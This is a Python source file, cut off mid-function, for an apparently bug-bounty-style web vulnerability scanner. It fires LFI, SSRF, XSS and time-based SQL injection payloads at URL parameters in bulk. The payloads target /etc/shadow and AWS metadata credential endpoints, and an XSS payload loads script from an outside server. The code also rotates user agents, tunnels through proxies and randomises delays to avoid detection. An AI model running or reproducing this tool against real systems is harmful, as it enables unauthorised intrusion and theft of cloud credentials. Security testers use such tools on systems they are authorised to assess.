# pip install slackclient
# pip install PySocks
from termcolor import colored
import re
from html import escape
import requests
import urllib.parse
import threading
import time
import random
import argparse
from queue import Queue, Empty as QueueEmpty
from colorama import Fore, Style, init
import urllib3
import sys
import warnings
import socks
import socket
import textwrap
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
# Notifications message
from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError
from datetime import datetime
import pytz
import gc  # For garbage collection
import os  # For file operations
import itertools  # For efficient iteration

# Suppress warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=requests.RequestsDependencyWarning)
# Initialize colorama
init()

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# User agent list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.1 Safari/602.3.12",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
]




lfi_payloads = [
    '/etc/passwd',
    '/etc/shadow',
    '/var/www/images/../../../etc/passwd',
    '../../../../../../../../../../../../../../../../../../etc/passwd',
    '....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2F%2Fpasswd',
    '....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252Fetc%252F%252Fpasswd',
    '../../../etc/passwd%00.png',
    '../../../etc/passwd%00.jpeg',
    '../../../../etc/group',
    '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd',
    '....//....//....//....//....//....//....//....//etc/passwd',
    '..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
    'file://\\/\\/etc/passwd',
    'file:///C:\\Windows\\System32\\drivers\\etc\\hosts'
]

ssrf_payloads = [
    'file:///etc/passwd',
    'file://\\/\\/etc/passwd',
    'file://////etc/passwd',
    'file:///etc/shadow',
    'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security0credentials/ec2-instance',
    'http://169.254.169.254/latest/metadata',
    'https://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-service-role-ssm-codedeploy',
    'http://169.254.169.254/latest/meta-data/hostname',
    'file:///C:/Windows/System32/drivers/etc/hosts',
    'file:///C:\\Windows\\System32\\drivers\\etc\\hosts',
    'https://google.com'
]


xss_simple_payloads = [
    "<<hello11>>",
    ">hello11<",
    "\"hello11\"",
    "'\"><script src=https://your_server.com></script>"
]

sql_injection_payloads = [
    ";sleep 17",
    "' || (select pg_sleep(17))--",
    "' || (select SLEEP(17))--",
    "' || dbms_pipe.receive_message(('a'),17)--",
    "0'XOR(if(now()=sysdate(),sleep(17),0))XOR'Z",
    "0'XOR(if(now()=sysdate(),sleep(17*1),0))XOR'Z",
    "if(now()=sysdate(),sleep(17),0)",
    "'XOR(if(now()=sysdate(),sleep(17),0))XOR'",
    "'XOR(if(now()=sysdate(),sleep(17*1),0))OR'",
    'if(now()=sysdate(),sleep(17),0)/"XOR(if(now()=sysdate(),sleep(17),0)OR"/',
    "if(now()=sysdate(),sleep(17),0)/*'XOR(if(now()=sysdate(),sleep(17),0))OR'\"XO",
    "R(if(now()=sysdate(),sleep(17),0))OR\"*/",
    "if(now()=sysdate(),sleep(17),0)/'XOR(if(now()=sysdate(),sleep(17),0))OR'\"XOR",
    "if(now()=sysdate(),sleep(17),0) and 5=5)\"/",
    "SLEEP(17)/*' or SLEEP(17) or '\" or SLEEP(17) or \"*/",
    "%2c(select%5*%5from%5(select(sleep(17)))a)",
    "(select(0)from(select(sleep(17)))v)",
    "(SELECT SLEEP(17))",
    "'%2b(select+from(select(sleep(17)))a)%2b'",
    "1'%2b(select*from(select(sleep(17)))a)%2b'",
    ",(select * from (select(sleep(17)))a)",
    "desc%2c(select*from(select(sleep(17)))a)",
    "-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(17))A))",
    "-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(17))A))",
    "(SELECT * FROM (SELECT(SLEEP(17)))YYYY)",
    "(SELECT * FROM (SELECT(SLEEP(17)))YYYY)#",
    "(SELECT * FROM (SELECT(SLEEP(17)))YYYY)--",
    "'+(select*from(select(sleep(17)))a)+'",
    "(select(0)from(select(sleep(17)))v)%2f+'",
    "(select(0)from(select(sleep(17)))v)+'\"",
    "(select(0)from(select(sleep(17)))v)%2f*'+",
    "(select(0)from(select(sleep(17)))v)+'\"+",
    "(select(0)from(select(sleep(17)))v)+\"*%2f",
    "(select(0)from(select(sleep(17)))v)/*'+",
    "(select(0)from(select(sleep(17)))v)+'\"+",
    "(select(0)from(select(sleep(17)))v)+\"*/",
    "',''),/*test/*%26%26%09sLeEp(17)%09--+",
    ">'%3bWAITFOR+DELAY+'00%3a00%3a17'--",
    "-if(now()=sysdate(),sleep(17),0)",
    "-(select(0)from(select(sleep(17)))v)",
    "-(SELECT * FROM (SELECT(SLEEP(17)))YYYY)",
    "-(SELECT * FROM (SELECT(SLEEP(17)))YYYY)#",
    "-(SELECT * FROM (SELECT(SLEEP(17)))YYYY)--"
]

lfi_ssrf_payloads = []  # Will be generated dynamically when needed

log_lock = threading.Lock()
progress_lock = threading.Lock()
vulnerability_lock = threading.Lock()  # New lock for vulnerability tracking
thread_local_storage = threading.local()
socket_lock = threading.Lock()  # New lock for socket operations
progress = 0
total_progress = 0
total_urls = 0
reported_vulnerabilities = set()
url_chunk_size = 1000  # Process URLs in chunks to save memory
quiet_mode = False
global_socks_proxy_enabled = False
global_socks_proxy_url = None

class PayloadGenerator:
    def __init__(self, payloads=None, file_path=None):
        self.payloads = payloads
        self.file_path = file_path

    def get_payloads(self):
        if self.file_path and os.path.exists(self.file_path):
            with open(self.file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        yield line
        elif self.payloads:
            for payload in self.payloads:
                yield payload
        else:
            yield from []


# Output file handling with context manager
class OutputFileManager:
    def __init__(self, filename=None):
        self.filename = filename
        self.file = None

    def __enter__(self):
        if self.filename:
            try:
                self.file = open(self.filename, 'w')
            except IOError as e:
                print(f"Error opening output file: {e}")
                self.file = None
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.file:
            self.file.close()

    def write(self, message):
        if self.file:
            self.file.write(re.sub(r'\033\[[0-9;]*m', '', message))
            self.file.flush()


def load_payloads_from_file(file_path):
    return PayloadGenerator(file_path=file_path)


def set_socks_proxy(proxy):
    """
    Configure SOCKS proxy for socket connections.
    This version uses global tracking to maintain proxy state.
    """
    global global_socks_proxy_enabled, global_socks_proxy_url

    with socket_lock:
        proxy_parts = proxy.split('://')
        if len(proxy_parts) == 2:
            proxy_type, proxy_address = proxy_parts
            host, port = proxy_address.split(':')
            port = int(port)
            proxy_type = proxy_type.lower()

            # Store original socket class globally if not already stored
            if not hasattr(socket, '_original_socket'):
                socket._original_socket = socket.socket

            # Set proxy for this thread
            if proxy_type == 'socks4':
                socks.set_default_proxy(socks.SOCKS4, host, port)
            elif proxy_type == 'socks5':
                socks.set_default_proxy(socks.SOCKS5, host, port)
            elif proxy_type == 'socks5h':
                # SOCKS5 with remote DNS resolution
                socks.set_default_proxy(socks.SOCKS5, host, port, rdns=True)
            else:
                raise ValueError("Unsupported SOCKS proxy type. Use 'socks4://', 'socks5://', or 'socks5h://'.")

            # Replace the global socket with the socksocket
            socket.socket = socks.socksocket

            # Set global flags
            global_socks_proxy_enabled = True
            global_socks_proxy_url = proxy

            # Flag that this thread has proxy configured
            thread_local_storage.proxy_configured = True
            return True
        else:
            raise ValueError(
                "Invalid SOCKS proxy format. Use 'socks4://host:port', 'socks5://host:port', or 'socks5h://host:port'.")


# 3. Update the reset_socks_proxy function
def reset_socks_proxy():
    """
    Reset socket implementation to the original one if it was modified.
    This version updates global state.
    """
    global global_socks_proxy_enabled, global_socks_proxy_url

    with socket_lock:
        if hasattr(socket, '_original_socket'):
            socket.socket = socket._original_socket
            if hasattr(thread_local_storage, 'proxy_configured'):
                delattr(thread_local_storage, 'proxy_configured')

            # Reset global flags
            global_socks_proxy_enabled = False
            global_socks_proxy_url = None

            return True
        return False


def follow_redirects(url, headers, max_redirects=5, proxies=None, socks_proxy_set=False, timeout=30):
    """Follow redirects for a given URL and return the final destination.
    Properly handles both SOCKS and HTTP proxies.
    """
    response = None
    try:
        # For SOCKS proxies, don't pass proxies parameter as it's configured globally
        if socks_proxy_set:
            response = requests.get(
                url,
                allow_redirects=False,
                timeout=timeout,
                headers=headers,
                verify=False
            )
        else:
            response = requests.get(
                url,
                allow_redirects=False,
                timeout=timeout,
                headers=headers,
                proxies=proxies,
                verify=False
            )

        redirect_history = []

        while response.is_redirect and len(redirect_history) < max_redirects:
            redirect_url = urljoin(url, response.headers['Location'])
            redirect_history.append(redirect_url)

            # Clean up previous response before making a new one
            old_response = response

            # For SOCKS proxies, don't pass proxies parameter
            if socks_proxy_set:
                response = requests.get(
                    redirect_url,
                    allow_redirects=False,
                    timeout=timeout,
                    headers=headers,
                    verify=False
                )
            else:
                response = requests.get(
                    redirect_url,
                    allow_redirects=False,
                    timeout=timeout,
                    headers=headers,
                    proxies=proxies,
                    verify=False
                )

            del old_response  # Explicitly delete old response

        if response.is_redirect:
            return None  # Max redirects reached

        return response.url
    except requests.RequestException:
        return None
    finally:
        # Always clean up the response
        if response:
            response.close()
            del response
            gc.collect()


def write_output(message, vulnerability_key=None, output_manager=None):
    global reported_vulnerabilities, quiet_mode

    # Use lock when modifying the shared set
    if vulnerability_key:
        with vulnerability_lock:  # Added lock for thread safety
            if vulnerability_key in reported_vulnerabilities:
                return
            reported_vulnerabilities.add(vulnerability_key)

    # Special handling for completion messages - always show these regardless of quiet mode
    is_completion_message = "Scanning completed on" in message

    if quiet_mode and not is_completion_message:
        # In quiet mode, only output the vulnerable URLs
        if vulnerability_key:  # Only process if it's a vulnerability report
            payload, reflection_type, status_message = vulnerability_key.split('|||')
            # Extract URLs from the message
            url_lines = [line.strip() for line in message.split('\n') if line.strip().startswith(f"{Fore.YELLOW}URL: ")]
            for url_line in url_lines:
                # Remove color codes and "URL: " prefix
                clean_url = re.sub(r'\033\[[0-9;]*m', '', url_line.replace(f"{Fore.YELLOW}URL: ", ""))
                sys.stdout.write(f"{clean_url}\n")
                if output_manager:
                    output_manager.write(f"{clean_url}\n")
    else:
        # Normal verbose output
        sys.stdout.write(message)
        sys.stdout.flush()
        if output_manager:
            output_manager.write(message)




# Pre-compile reflection detection patterns for better performance
ATTR_PATTERN_TEMPLATE = r'<[^>]*{}[^>]*>'
TEXT_PATTERN_TEMPLATE = r'>([^<]*{}[^<]*)<'
VALUE_PATTERN_TEMPLATE = r'=["\'][^"\']*{}[^"\']*["\']'


def find_reflection(content, payload):
    # Optimized reflection detection
    if not content or not payload or payload not in content:
        return None

    try:
        escaped_payload = re.escape(payload)

        # Compile specific patterns for this payload
        attr_pattern = re.compile(ATTR_PATTERN_TEMPLATE.format(escaped_payload))
        text_pattern = re.compile(TEXT_PATTERN_TEMPLATE.format(escaped_payload))
        value_pattern = re.compile(VALUE_PATTERN_TEMPLATE.format(escaped_payload))

        # Use the compiled patterns directly
        patterns = [
            (attr_pattern, "attribute"),
            (text_pattern, "text"),
            (value_pattern, "value")
        ]

        for pattern, context in patterns:
            match = pattern.search(content)
            if match:
                full_match = match.group(0)
                payload_index = full_match.index(payload)
                start = max(0, payload_index - 20)  # Reduced context size
                end = min(len(full_match), payload_index + len(payload) + 20)  # Reduced context size
                truncated_match = full_match[start:end]

                if start > 0:
                    truncated_match = "..." + truncated_match
                if end < len(full_match):
                    truncated_match = truncated_match + "..."

                return f"{truncated_match} (Context: {context})"
        return None
    except Exception:
        # Fallback if regex fails
        return "Reflection found (details unavailable)" if payload in content else None


def detect_partial_reflection(content, payload):
    # Quick check before heavy processing
    if not content or not payload:
        return None

    if payload.startswith('<<') and payload.endswith('>>'):
        inner = payload[2:-2]
        if f'&lt;<{inner}>&gt;' in content or f'<{inner}>' in content:
            return f'Partial reflection detected: {payload} -> &lt;<{inner}>&gt; or <{inner}>'
    return None



def scan_url(url, payload_generator, timeout, delay, debug, proxy, attack_type, custom_headers,
             output_manager, use_random_agent, custom_user_agent, socks_proxy_already_set=False):
    global user_agents
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
    headers = custom_headers.copy()

    if custom_user_agent:
        headers['User-Agent'] = custom_user_agent
    elif use_random_agent:
        headers['User-Agent'] = random.choice(user_agents)
    elif 'User-Agent' not in headers:
        headers['User-Agent'] = random.choice(user_agents)

    # Configure proxy - Only set it if not already configured at thread level
    proxies = None
    socks_proxy_set = socks_proxy_already_set  # Use the flag passed from worker

    if proxy and not socks_proxy_already_set:
        if proxy.startswith(('socks4://', 'socks5://', 'socks5h://')):
            try:
                set_socks_proxy(proxy)
                socks_proxy_set = True
                if debug:
                    write_output(f"DEBUG: SOCKS proxy configured for URL {url}: {proxy}\n",
                                 output_manager=output_manager)
            except Exception as e:
                if debug:
                    write_output(f"DEBUG: Error setting SOCKS proxy for URL {url}: {str(e)}\n",
                                 output_manager=output_manager)
                return  # Skip this URL if proxy setup fails
        else:
            # HTTP/HTTPS proxy
            proxies = {'http': proxy, 'https': proxy}
            if debug:
                write_output(f"DEBUG: HTTP proxy configured for URL {url}: {proxy}\n", output_manager=output_manager)

    final_url = None
    try:
        # Use the updated follow_redirects function with proxies and socks_proxy_set flag
        final_url = follow_redirects(url, headers, max_redirects=5, proxies=proxies,
                                    socks_proxy_set=socks_proxy_set, timeout=timeout)
        if not final_url:
            if debug:
                write_output(f"Skipping inaccessible URL (after redirects): {url}\n", output_manager=output_manager)
            return
    except Exception as e:
        if debug:
            write_output(f"Error scanning URL {url}: {str(e)}\n", output_manager=output_manager)
        # Only reset proxy if we set it specifically for this request, not if it was set at thread level
        if proxy and not socks_proxy_already_set and socks_proxy_set:
            reset_socks_proxy()
            if debug:
                write_output(f"DEBUG: SOCKS proxy reset after error scanning URL\n", output_manager=output_manager)
        return

    vulnerable_params = {}

    for payload in payload_generator.get_payloads():
        request_headers = headers.copy()
        if use_random_agent and not custom_user_agent:
            request_headers['User-Agent'] = random.choice(user_agents)

        if attack_type in ['xssSimple']:
            parsed_final_url = urllib.parse.urlparse(final_url)
            final_params = urllib.parse.parse_qs(parsed_final_url.query, keep_blank_values=True)

            # Memory-efficient parameter modification
            modified_params = {}
            for param, value in final_params.items():
                if not value or value[0] == '':
                    modified_params[param] = [payload]
                else:
                    modified_params[param] = [value[0] + payload]

            new_query = urllib.parse.urlencode(modified_params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed_final_url._replace(query=new_query))

            response = None
            try:
                # Consistent proxy handling
                if socks_proxy_set:
                    response = requests.get(new_url, timeout=timeout, verify=False, headers=request_headers)
                else:
                    response = requests.get(new_url, timeout=timeout, verify=False, proxies=proxies, headers=request_headers)
                status_code = response.status_code
                content_length = len(response.content)
                status_message = f"Status Code: {status_code}, Content Length: {content_length}"

                if debug:
                    write_output(f"DEBUG: Request made to {new_url}\n", output_manager=output_manager)
                    write_output(f"DEBUG: Status Code: {status_code}, Content Length: {content_length}\n",
                                 output_manager=output_manager)

                content_type = response.headers.get('Content-Type', '').lower()

                if 'text/html' in content_type or 'application/xhtml+xml' in content_type or 'text/xml' in content_type or 'application/xml' in content_type:
                    # Process only textual content where XSS is possible
                    text_content = response.text
                    reflection = find_reflection(text_content, payload)
                    partial_reflection = detect_partial_reflection(text_content, payload)
                    full_page_reflection = payload in text_content

                    # Vulnerability Recording
                    if reflection or partial_reflection or full_page_reflection:
                        reflection_type = reflection or partial_reflection or 'Full Page Reflection'
                        vulnerability_key = f"{payload}|||{reflection_type}|||{status_message}"
                        with vulnerability_lock:
                            if vulnerability_key not in vulnerable_params:
                                vulnerable_params[vulnerability_key] = []
                            vulnerable_params[vulnerability_key].append(new_url)

            except requests.RequestException as e:
                if debug:
                    write_output(f"Error with URL {new_url}: {e}\n", output_manager=output_manager)

            finally:
                # Clear response data to free memory
                if response:
                    response.close()
                    del response
                    gc.collect()

            # Add randomization to delay to avoid patterns
            sleep_time = delay / 1000.0
            if delay > 0:
                sleep_time += random.uniform(-delay * 0.2, delay * 0.2) / 1000.0
                sleep_time = max(0.001, sleep_time)  # Ensure minimum delay
            time.sleep(sleep_time)


        elif attack_type in ['lfi', 'ssrf', 'lfi-ssrf']:
            parsed_final_url = urllib.parse.urlparse(final_url)
            final_params = urllib.parse.parse_qs(parsed_final_url.query, keep_blank_values=True)
            # Build modified parameters using final_params instead of params (Fixed the bug)
            modified_params = {param: [payload] for param, value in final_params.items()}
            new_query = urllib.parse.urlencode(modified_params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed_final_url._replace(query=new_query))
            response = None
            try:
                if socks_proxy_set:
                    response = requests.get(new_url, timeout=timeout, verify=False, headers=request_headers)
                else:
                    response = requests.get(new_url, timeout=timeout, verify=False, proxies=proxies,
                                            headers=request_headers)
                status_code = response.status_code
                content_length = len(response.content)
                elapsed_time = response.elapsed.total_seconds()
                status_message = f"Status Code: {status_code}, Content Length: {content_length}"
                if debug:
                    write_output(f"DEBUG: Request made to {new_url}\n", output_manager=output_manager)
                    write_output(f"DEBUG: Status Code: {status_code}, Content Length: {content_length}\n",
                                 output_manager=output_manager)
                # Use response text only once and store it to reduce memory usage
                response_text = response.text
                vulnerability_detected = False
                reflection_type = ""
                # Check for specific patterns depending on attack type
                if attack_type == 'lfi' and ('root:x:' in response_text or 'daemon:x' in response_text or ('127.0.0.1' in response_text and 'localhost name resolution is handled within DNS itself' in response_text)):
                    vulnerability_detected = True
                    reflection_type = "LFI detected"
                elif attack_type == 'ssrf' and ('root:x:' in response_text or 'daemon:x' in response_text or ('127.0.0.1' in response_text and 'localhost name resolution is handled within DNS itself' in response_text) or ('ami-id' in response_text and 'ami-launch-index' in response_text) or
                                                ('AccessKeyId' in response_text and 'SecretAccessKey' in response_text) or '<title>Google</title>' in response_text):
                    vulnerability_detected = True
                    reflection_type = "SSRF detected"
                elif attack_type == 'lfi-ssrf' and ('root:x:' in response_text or 'daemon:x' in response_text or
                                                    ('127.0.0.1' in response_text and 'localhost name resolution is handled within DNS itself' in response_text) or
                                                    ('ami-id' in response_text and 'ami-launch-index' in response_text) or
                                                    ('AccessKeyId' in response_text and 'SecretAccessKey' in response_text) or '<title>Google</title>' in response_text):
                    vulnerability_detected = True
                    reflection_type = "LFI or SSRF detected"
                if vulnerability_detected:
                    vulnerability_key = f"{payload}|||{reflection_type}|||{status_message}"
                    with vulnerability_lock:
                        if vulnerability_key not in vulnerable_params:
                            vulnerable_params[vulnerability_key] = []
                        vulnerable_params[vulnerability_key].append(new_url)
            except requests.RequestException as e:
                if debug:
                    write_output(f"Error with URL {new_url}: {e}\n", output_manager=output_manager)
            finally:
                # Clean up resources
                if response:
                    response.close()
                    del response
                    gc.collect()
            # Add randomization to delay
            sleep_time = delay / 1000.0
            if delay > 0:
                sleep_time += random.uniform(-delay * 0.2, delay * 0.2) / 1000.0
                sleep_time = max(0.001, sleep_time)
            time.sleep(sleep_time)


        elif attack_type == 'sql':
            parsed_final_url = urllib.parse.urlparse(final_url)
            final_params = urllib.parse.parse_qs(parsed_final_url.query, keep_blank_values=True)
            # Build URL with all parameters appended with the payload
            modified_params = {}
            for param, values in final_params.items():
                if isinstance(values, list):
                    # Append payload to each value in the list
                    modified_params[param] = [str(val) + payload for val in values]
                else:
                    modified_params[param] = [str(values) + payload]
            new_query = urllib.parse.urlencode(modified_params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed_final_url._replace(query=new_query))
            response = None
            response2 = None
            vulnerability_detected = False

            try:
                # First request to check for delay
                # Use a longer timeout for SOCKS proxy to account for proxy overhead + SQL delay
                sql_timeout = timeout + 25 if socks_proxy_set else timeout + 20
                if debug:
                    write_output(f"DEBUG: SQL injection test - URL: {new_url}\n", output_manager=output_manager)
                    write_output(f"DEBUG: Using timeout: {sql_timeout}s (SOCKS: {socks_proxy_set})\n",
                                 output_manager=output_manager)
                start_time = time.time()
                try:
                    if socks_proxy_set:
                        response = requests.get(new_url, timeout=sql_timeout, verify=False, headers=request_headers)
                    else:
                        response = requests.get(new_url, timeout=sql_timeout, verify=False, proxies=proxies,
                                                headers=request_headers)
                    elapsed_time = time.time() - start_time
                    status_code = response.status_code
                    content_length = len(response.content)

                except requests.exceptions.Timeout as e:

                    # Calculate how long it took before timeout
                    elapsed_time = time.time() - start_time
                    status_code = "TIMEOUT"
                    content_length = 0
                    if debug:
                        write_output(f"DEBUG: Request timed out after {elapsed_time:.2f}s\n",
                                     output_manager=output_manager)
                if debug:
                    write_output(f"DEBUG: First request elapsed time: {elapsed_time:.2f}s\n",
                                 output_manager=output_manager)

                if status_code in [400, 403, 504]:
                    if debug:
                        write_output(
                            f"DEBUG: Skipping URL due to status code {status_code} (indicates not vulnerable)\n",
                            output_manager=output_manager)
                    # Skip this payload for this URL as it's not vulnerable
                    continue

                # Adjust detection threshold for SOCKS proxy (allow more variance)
                min_delay = 17
                max_delay = 26 if socks_proxy_set else 25
                # If response took approximately 17 seconds (with tolerance)
                if min_delay <= elapsed_time <= max_delay:
                    if debug:
                        write_output(f"DEBUG: Potential SQL injection detected, confirming with second request...\n",
                                     output_manager=output_manager)
                    # Second request to confirm (without sleep payload for comparison)
                    # Build clean URL without payload
                    clean_query = urllib.parse.urlencode(final_params, doseq=True)
                    clean_url = urllib.parse.urlunparse(parsed_final_url._replace(query=clean_query))
                    start_time2 = time.time()

                    try:
                        # Use normal timeout for clean request
                        if socks_proxy_set:
                            response2 = requests.get(clean_url, timeout=timeout, verify=False, headers=request_headers)
                        else:
                            response2 = requests.get(clean_url, timeout=timeout, verify=False, proxies=proxies,
                                                     headers=request_headers)
                        elapsed_time2 = time.time() - start_time2
                    except requests.exceptions.Timeout:
                        elapsed_time2 = time.time() - start_time2
                        if debug:
                            write_output(f"DEBUG: Second request timed out after {elapsed_time2:.2f}s\n",
                                         output_manager=output_manager)
                    if debug:
                        write_output(f"DEBUG: Second request (clean) elapsed time: {elapsed_time2:.2f}s\n",
                                     output_manager=output_manager)
                    # If the clean request is significantly faster, it's likely vulnerable
                    # Adjust threshold for SOCKS proxy
                    time_diff_threshold = 12 if socks_proxy_set else 15
                    if elapsed_time2 < 8 and (elapsed_time - elapsed_time2) >= time_diff_threshold:
                        vulnerability_detected = True
                        reflection_type = f"Time-based SQL Injection detected (Delay: {elapsed_time:.2f}s vs {elapsed_time2:.2f}s)"
                        status_message = f"Status Code: {status_code}, Content Length: {content_length}"
                        vulnerability_key = f"{payload}|||{reflection_type}|||{status_message}"
                        with vulnerability_lock:
                            if vulnerability_key not in vulnerable_params:
                                vulnerable_params[vulnerability_key] = []
                            vulnerable_params[vulnerability_key].append(new_url)
                            if debug:
                                write_output(
                                    f"DEBUG: SQL Injection confirmed! Time difference: {elapsed_time - elapsed_time2:.2f}s\n",
                                    output_manager=output_manager)

                # Also check for timeout-based detection (some payloads might cause complete timeout)

                elif elapsed_time > max_delay and status_code == "TIMEOUT":
                    if debug:
                        write_output(f"DEBUG: Checking timeout-based SQL injection...\n", output_manager=output_manager)
                    # Verify with clean request
                    clean_query = urllib.parse.urlencode(final_params, doseq=True)
                    clean_url = urllib.parse.urlunparse(parsed_final_url._replace(query=clean_query))
                    start_time2 = time.time()
                    try:
                        if socks_proxy_set:
                            response2 = requests.get(clean_url, timeout=timeout, verify=False, headers=request_headers)
                        else:
                            response2 = requests.get(clean_url, timeout=timeout, verify=False, proxies=proxies,
                                                     headers=request_headers)
                        elapsed_time2 = time.time() - start_time2
                        # If clean request is fast but payload request timed out, likely vulnerable
                        if elapsed_time2 < 5:
                            vulnerability_detected = True
                            reflection_type = f"Time-based SQL Injection detected via timeout (Timeout after {elapsed_time:.2f}s vs clean {elapsed_time2:.2f}s)"
                            status_message = f"Status Code: TIMEOUT"
                            vulnerability_key = f"{payload}|||{reflection_type}|||{status_message}"
                            with vulnerability_lock:
                                if vulnerability_key not in vulnerable_params:
                                    vulnerable_params[vulnerability_key] = []
                                vulnerable_params[vulnerability_key].append(new_url)
                    except Exception as e:
                        if debug:
                            write_output(f"DEBUG: Error in timeout verification: {str(e)}\n",
                                         output_manager=output_manager)
            except requests.RequestException as e:

                if debug:
                    write_output(f"Error with URL {new_url}: {e}\n", output_manager=output_manager)
            finally:
                # Clean up resources
                if response:
                    response.close()
                    del response
                if response2:
                    response2.close()
                    del response2
                gc.collect()
            # Add randomization to delay
            sleep_time = delay / 1000.0
            if delay > 0:
                sleep_time += random.uniform(-delay * 0.2, delay * 0.2) / 1000.0
                sleep_time = max(0.001, sleep_time)
            time.sleep(sleep_time)


    # Output results in batches to reduce memory pressure
    for vulnerability_key, urls in vulnerable_params.items():
        payload, reflection_type, status_message = vulnerability_key.split('|||')
        output = f"{Fore.YELLOW}URL: "
        for url in urls:
            output += f"{url}{Style.RESET_ALL}\n"
        output += f"{Fore.CYAN}Payload: {payload}{Style.RESET_ALL}\n"
        output += f"  {Fore.GREEN}{reflection_type}{Style.RESET_ALL}\n"
        output += f"  {status_message}\n"
        output += "\n"
        write_output(output, vulnerability_key, output_manager)

    # Important: Do NOT reset the SOCKS proxy here if it was set at thread level
    # Only reset if we set it specifically for this request
    if proxy and not socks_proxy_already_set and socks_proxy_set:
        reset_socks_proxy()
        if debug:
            write_output(f"DEBUG: SOCKS proxy reset after scanning URL\n", output_manager=output_manager)


def worker(queue, payload_generator, timeout, delay, debug, proxy, attack_type, custom_headers,
           output_manager, use_random_agent, custom_user_agent, stop_event):
    """
    Worker function that handles SOCKS proxy consistently using global state.
    """
    global progress, global_socks_proxy_enabled

    # SOCKS proxy is configured at the main thread level, no need to set per worker
    socks_proxy_set = global_socks_proxy_enabled

    # Log that we're using the global proxy state
    if socks_proxy_set and debug:
        write_output(f"DEBUG: Worker thread using global SOCKS proxy configuration\n",
                     output_manager=output_manager)

    try:
        while not stop_event.is_set():
            try:
                # Use get_nowait() with a short timeout to check stop_event frequently
                try:
                    url = queue.get(timeout=1.0)
                except QueueEmpty:
                    # No more URLs in the queue, exit
                    break

                # Check stop_event after getting a URL, before processing
                if stop_event.is_set():
                    # Put the URL back if possible
                    try:
                        queue.put(url)
                    except:
                        pass
                    break

                # Process the URL with proper error handling
                try:
                    # For HTTP/HTTPS proxies, pass the proxy to scan_url
                    # For SOCKS proxies, we've already configured it globally
                    effective_proxy = None if socks_proxy_set else proxy

                    # Pass socks_proxy_set to indicate proxy is already configured
